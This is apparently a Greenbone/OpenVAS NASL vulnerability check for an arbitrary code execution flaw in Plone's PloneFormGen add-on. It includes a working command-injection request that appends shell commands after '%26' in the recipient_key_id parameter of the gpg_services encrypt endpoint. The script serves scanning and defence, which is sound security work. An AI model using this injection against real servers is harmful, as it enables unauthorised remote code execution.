# Copyright (C) 2013 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:plone:plone";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103736");
  script_version("2022-03-14T14:16:20+0000");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
  script_tag(name:"last_modification", value:"2022-03-14 14:16:20 +0000 (Mon, 14 Mar 2022)");
  script_tag(name:"creation_date", value:"2013-06-12 11:35:33 +0200 (Wed, 12 Jun 2013)");
  script_name("Plone CMS 'PloneFormGen' Add-On 1.7.4 - 1.7.8 Arbitrary Code Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_plone_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("plone/http/detected");

  script_xref(name:"URL", value:"https://web.archive.org/web/20150428030448/http://plone.org/products/plone/security/advisories/ploneformgen-vulnerability-requires-immediate-upgrade");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/60247");

  script_tag(name:"summary", value:"The PloneFormGen add-on of Plone CMS is prone to an arbitrary
  code execution vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An attacker can leverage this issue to execute arbitrary code
  within the context of the application.");

  script_tag(name:"affected", value:"The PloneFormGen add-on in versions 1.7.4 through 1.7.8 is
  known to be vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"Update th PloneFormGen add-on to version 1.7.11 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

cmds = exploit_commands();

foreach cmd(keys(cmds)) {

  url = dir + "/@@gpg_services/encrypt?data=&recipient_key_id=%26" + cmds[cmd];

  if(http_vuln_check(port:port, url:url, pattern:cmd)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
